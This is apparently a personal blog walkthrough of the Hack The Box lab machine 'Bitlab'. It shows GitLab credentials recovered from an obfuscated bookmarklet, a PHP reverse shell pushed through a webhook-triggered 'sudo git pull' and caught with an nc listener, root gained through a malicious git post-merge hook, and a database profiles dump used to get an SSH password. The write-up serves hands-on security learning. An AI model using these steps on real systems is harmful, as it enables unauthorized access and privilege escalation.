+++
date = "2020-01-11T00:00:00Z"
tags = ["linux", "htb-medium", "php", "rce", "git", "web", "ssh", "sudo"]
categories = ["Hack the Box"]
title = "Hack The Box - Bitlab"
images = ["https://ceso.github.io/images/htb/bitlab/bitlab-header.jpg"]
description = "My write-up / walkthrough for Bitlab from Hack The Box."
toc = true
aliases = [
    "/hack-the-box/bitlab/"
]
+++
{{< image src="/images/htb/bitlab/info-card.png" position="center" style="border-radius: 8px;" >}}

## Quick Summary

First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the ```sudo + git``` path as I'm just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.

This was a cool box, not hard at the technical level, but one that required to enumerate a lot, so pretty cool to get better at that!

Said that, let's get our hands dirty :D

## Nmap

We start running nmap to get which ports/services are being exposed:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
```

And we get SSH (22) and HTTP (80) are open + that the web service which is running on port 80 is [Gitlab](https://gitlab.com/).

## Web enumeration

The home page (```http://10.10.10.114/```), is just the standard login page which bitlab has:

{{< image src="/images/htb/bitlab/1.1-web_enum.png" position="center" style="border-radius: 8px;" >}}

We try the links in this page and check if they are working, with it we found ```Help``` it is, and we are redirected to a directory listing having a ```bookmarks.html``` and open it:

{{< image src="/images/htb/bitlab/1.2-web_enum.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/bitlab/1.3-web_enum.png" position="center" style="border-radius: 8px;" >}}

We notice that ```Gitlab Login``` is an obfuscated js code, we jump into deobfuscate it (I used [de4js](https://lelinhtinh.github.io/de4js/) but any deobfuscation tool or even a python console will do it):

From the code:

```js
javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```

We get the following code:

```js
javascript: (function () {
    var _0x4b18 = ["value", "user_login", "getElementById", "clave", "user_password", "11des0081x"];
    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()
```

With that we get credentials we could try into the login, an user called ```clave``` and a password ```11des0081x```, after we try to login with those credentials we are loged and have access to some projects:

{{< image src="/images/htb/bitlab/1.5-web_enum.png" position="center" style="border-radius: 8px;" >}}

Taking a deepest look into ```Profile``` we find that this project has [Auto DevOps](https://docs.gitlab.com/ee/topics/autodevops/) enabled.
We continue enumerating a bit more, and see that the project called ```Deployer``` is in charge to manage to do that: deploy the applications, in the description is given a link pointing to the we take a look into the documentation of [webhooks](https://docs.gitlab.com/ee/user/project/integrations/webhooks.html) gitlab has, after it we take a look into ```index.php``` to see what it does:

{{< image src="/images/htb/bitlab/1.6-web_enum.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/bitlab/1.7-web_enum.png" position="center" style="border-radius: 8px;" >}}

```php
<?php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),"\n";
}

echo "OK\n";
```

Tying together the pieces we have at this point, we can figure out the foothold: we need to upload a php reverse shell, having it merged to master (the code of ```index.php``` specifies git pull will being executed basically if there was a merge to master), once that is done, a webhook will execute ```index.php``` from ```Deployer``` with this we will have our reverse shell uploaded to server.

## RCE -> www-data -> root

We upload the next [php reverse shell by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) changing ```$ip = '127.0.0.1'``` and ```$port = 1234``` to our ip and the port we will be listening in our machine, afterwards we merge it (we will be automatically redirected to the page for merging it).

Now, the reverse shell is uploaded, but we still need to execute it, for that is needed to know which one is the path to execute it, if we remember the project ```Deployer``` has it's index.php which will print an "OK" we could try to access the path of deployer and see if it is printed, if it is, then we know that the path for our reverse shell will be ```http://10.0.0.14/profile/<name of our reverse shell>```:

{{< image src="/images/htb/bitlab/1.rce.png" position="center" style="border-radius: 8px;" >}}

Now we know that indeed that the mentioned url above will be the one wee need to use.
We run the listener for our reverse shell and execute it, with it having our rce:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@bitlab:/var/www$ pwd
pwd
/var/www
```

We check if we have sudo rights, where is the home of www-data and what we found there:

```console
www-data@bitlab:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/var/www$ getent passwd www-data
getent passwd www-data
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
cd /var/www/html/profile
www-data@bitlab:/var/www/html/profile$ ls -la
ls -la
total 144
drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
```

So far we know that the repos of git are under ```/var/www/html/``` and that we are allowed to do a git pull with sudo rights inside the repos, this is what we will be using to get root by taking advantage of the webhooks enabled in gitlab (post-merge hook) and the ability to run git pull with root rights (```git pull``` is like git fetch and git merge in one for saying it in a way), for understanding how these 2 things work, jump into the documentation of [hooks: post merge](https://git-scm.com/docs/githooks#_post_merge) and the one for [git pull](https://git-scm.com/docs/git-pull).

Our repo doesn't allow us to edit files there, so we copy the repo to a place where we have them:

```console
www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
cp -r profile /tmp/profile
www-data@bitlab:/tmp/profile$ ls -la
ls -la
total 148
drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
```

We create a script named as ```post-merge``` inside ```.git/hooks``` to get a shell as root and give to it execution rights:

```console
www-data@bitlab:/tmp/profile$ cd .git/hooks
cd .git/hooks
www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0<&2 1>&2' > post-merge
< 'exec /bin/bash 0<&2 1>&2' > post-merge
www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
chmod u+x post-merge
```

Once that is done, we upload any file (doesn't matter) to gitlab and merge it, once that is done from inside this location we have rights, we run ```sudo git pull``` and with that we will be root:

```console
www-data@bitlab:/tmp/profile$ sudo git pull
sudo git pull
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
Unpacking objects: 100% (3/3), done.
remote: Total 3 (delta 2), reused 0 (delta 0)
From ssh://localhost:3022/root/profile
   35da5b2..cbbc729  master     -> origin/master
 * [new branch]      patch-2    -> origin/patch-8
Updating 35da5b2..cbbc729
Fast-forward
 1asf | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 1asf
root@bitlab:/tmp/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bitlab:/tmp/profile# cd /root    
cd /root
root@bitlab:~# ls   
ls 
root.txt
root@bitlab:~# wc -c root.txt
wc -c root.txt
33 root.txt
```

With this we can already go to ```/home``` and see from there which user and it's respective flag.

## Beyond root

Ok, as I said at the begining of the post, there are 2 paths to get this box:

1 - Intended way (user -> root) by doing reversing.
2 - Taking advantage of this misconfigurations.

I will go now into the 1, but I will only cover how to get user, and in the future once I know some reversing, I will post the last piece.

## User

In the home page of the Profile project, there is a hint, is mentioned a connection postgresql and snippets, we go to the snippets page, and we found we have one

{{< image src="/images/htb/bitlab/1-intended_user.png" position="center" style="border-radius: 8px;" >}}

We open it and se it's a script to connect to the database and get a dump of profiles:

```js
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

Then, inside the profile project we add a new file with that code, but also we create an array with ```pg_fetch_all($result)``` in order to save all the profiles dumped, so the result is this one:

```js
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
$arr = pg_fetch_all($result);
print_r($arr);
```

After save and merge of it, we go to ```http://10.10.10.114/profile/<name you give to the script>```, and we should get as a result printed an array with our previous user ```clave``` and a password:

```js
Array ( [0] => Array ( [id] => 1 [username] => clave [password] => c3NoLXN0cjBuZy1wQHNz== ) )
```

Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!

```console
root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
clave@10.10.10.114's password: 
Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
clave@bitlab:~$ id
uid=1000(clave) gid=1000(clave) groups=1000(clave)
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -> /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
clave@bitlab:~$ wc -c user.txt 
33 user.txt
```

We got user shell, and after listing the files in it's home there is an interesting .exe called ```RemoteConnection.exe```, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it's hiding, but as I said before this will be an update in the future once I know how to do it :P.

So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.

Until nex write up!
